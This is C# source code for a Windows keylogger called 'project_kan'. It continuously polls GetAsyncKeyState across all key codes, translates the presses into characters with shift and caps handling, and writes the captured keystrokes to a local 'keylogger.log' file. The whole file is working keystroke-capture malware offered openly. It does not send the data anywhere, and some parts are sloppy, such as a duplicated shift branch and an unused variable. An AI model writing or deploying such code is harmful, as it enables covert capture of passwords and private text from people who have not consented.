using System.Runtime.InteropServices;

namespace project_kan
{
    internal static class Program
    {
        [STAThread]
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        static void Main(String[] args)
        {
            File.Delete("keylogger.log");
            string buf = "";
            while (true)
            {
                Thread.Sleep(100); //key-press time (~100 ms)

                for (int i = 0; i < 255; i++)
                {
                    int state = GetAsyncKeyState(i);

                    bool shift = false;
                    short shiftState = (short)GetAsyncKeyState(16);
                    if ((shiftState & 0x8000) == 0x8000)
                    {
                        shift = true;
                    }
                    var caps = Console.CapsLock;
                    bool isBig = shift | caps;

                    if (state != 0)
                    {
                        //pre-processing
                        //spaces
                        if (((Keys)i) == Keys.Space) { buf += " "; continue; }
                        //line breaks
                        if (((Keys)i) == Keys.Enter) { buf += "\r\n"; continue; }
                        //tab
                        if (((Keys)i) == Keys.Tab) { buf += "\t"; continue; }
                        //shift & caps
                        if (((Keys)i).ToString().Contains("Shift") || ((Keys)i) == Keys.Capital) { continue; }
                        //f-keys
                        if (((Keys)i).ToString().Contains("F1") || ((Keys)i).ToString().Contains("F2") || ((Keys)i) == Keys.F3 || ((Keys)i) == Keys.F4 || ((Keys)i) == Keys.F5 || ((Keys)i) == Keys.F6 || ((Keys)i) == Keys.F7 || ((Keys)i) == Keys.F8 || ((Keys)i) == Keys.F9) { continue; }
                        //controllers
                        if (((Keys)i) == Keys.LButton || ((Keys)i) == Keys.RButton || ((Keys)i) == Keys.MButton) continue;
                        //other keys (requires additional analysis) - I need to know TYPES OF KEYBOARDS
                        //!!!
                        //!!!
                        //!!!
                        if (((Keys)i) == Keys.Escape || ((Keys)i) == Keys.NumLock || ((Keys)i) == Keys.PrintScreen || ((Keys)i) == Keys.ControlKey || ((Keys)i) == Keys.LControlKey || ((Keys)i) == Keys.RControlKey || ((Keys)i) == Keys.LWin || ((Keys)i) == Keys.RWin || ((Keys)i) == Keys.Left || ((Keys)i) == Keys.Right || ((Keys)i) == Keys.Up || ((Keys)i) == Keys.Down) continue;
                        //alphas
                        if (((Keys)i).ToString().Length == 1)
                        {
                            if (isBig)
                            {
                                buf += ((Keys)i).ToString();
                            }
                            else
                            {
                                buf += ((Keys)i).ToString().ToLowerInvariant();
                            }
                        }
                        else
                        {
                            switch (((Keys)i).ToString())
                            {
                                //numm (up)
                                case "D1":
                                    if (shift) buf += "!";
                                    else buf += "1";
                                    break;
                                case "D2":
                                    if (shift) buf += "@";
                                    else if (shift) buf += '"';
                                    else buf += "2";
                                    break;
                                case "D3":
                                    if (shift) buf += "#";
                                    else buf += "3";
                                    break;
                                case "D4":
                                    if (shift) buf += "$";
                                    else buf += "4";
                                    break;
                                case "D5":
                                    if (shift) buf += "%";
                                    else buf += "5";
                                    break;
                                case "D6":
                                    if (shift) buf += "^";
                                    else buf += "6";
                                    break;
                                case "D7":
                                    if (shift) buf += "&";
                                    else buf += "7";
                                    break;
                                case "D8":
                                    if (shift) buf += "*";
                                    else buf += "8";
                                    break;
                                case "D9":
                                    if (shift) buf += "(";
                                    else buf += "9";
                                    break;
                                case "D0":
                                    if (shift) buf += ")";
                                    else buf += "0";
                                    break;
                                case "Oemplus":
                                    if (shift) buf += "+";
                                    else buf += "=";
                                    break;
                                case "OemMinus":
                                    if (shift) buf += "_";
                                    else buf += "-";
                                    break;
                                case "Oem1":
                                    if (shift) buf += ":";
                                    else buf += ";";
                                    break;
                                case "OemQuestion":
                                    if (shift) buf += "?";
                                    else buf += "/";
                                    break;
                                case "OemPeriod":
                                    if (shift) buf += ">";
                                    else buf += ".";
                                    break;
                                case "Oemcomma":
                                    if (shift) buf += "<";
                                    else buf += ",";
                                    break;
                                case "Oem7":
                                    if (shift) buf += '"';
                                    else buf += "'";
                                    break;
                                case "OemOpenBrackets":
                                    if (shift) buf += "{";
                                    else buf += "[";
                                    break;
                                case "Oem6":
                                    if (shift) buf += "}";
                                    else buf += "]";
                                    break;
                                case "Oemtilde":
                                    if (shift) buf += "~";
                                    else buf += "`";
                                    break;
                                case "Oem5":
                                    if (shift) buf += "|";
                                    else buf += '\\';
                                    break;
                                case "Menu":
                                    if (shift) buf += "<alt>";
                                    break;
                                case "LMenu":
                                    if (shift) buf += "<alt>";
                                    break;
                                case "RMenu":
                                    if (shift) buf += "<alt>";
                                    break;
                                default:
                                    buf += $"<{((Keys)i).ToString()}>"; //more types
                                    break;
                            }
                        }
                        short altState = (short)GetAsyncKeyState(164);
                        //every 10 symbols
                        if (buf.Length > 10)
                        {
                            File.AppendAllText("keylogger.log", buf);
                            buf = "";
                        }
                    }
                }
            }
        }
    }
}